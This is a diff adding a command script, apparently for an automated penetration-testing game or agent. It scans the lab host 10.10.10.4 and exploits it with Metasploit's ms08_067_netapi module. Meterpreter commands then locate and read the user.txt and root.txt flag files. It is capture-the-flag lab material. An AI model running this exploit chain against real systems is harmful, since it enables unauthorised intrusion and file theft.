@@ -1,0 +1,26 @@
+#db_nmap; guess_options; set delay_to_observe 1; set dst_ip 10.10.10.4; set mode top_1000; run;
+db_nmap; options; guess_options; run;
+
+#exploit/windows/smb/ms08_067_netapi; guess_options; set delay_to_observe 1; set rhosts 10.10.10.4; run;
+exploit/windows/smb/ms08_067_netapi; options; guess_options; run;
+
+set_game_type PRIVESC;
+
+#execute_meterpreter_command_in_session; set command search -d C:\\ -f user.txt; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
+
+#execute_meterpreter_command_in_session; set command cat C:\\Documents\ and\ Settings\\john\\Desktop\\user.txt; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
+
+#execute_meterpreter_command_in_session; set command search -d C:\\ -f root.txt; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
+
+#execute_meterpreter_command_in_session; set command cat C:\\Documents\ and\ Settings\\Administrator\\Desktop\\root.txt; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
+
+execute_meterpreter_command_in_session; options; guess_options; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
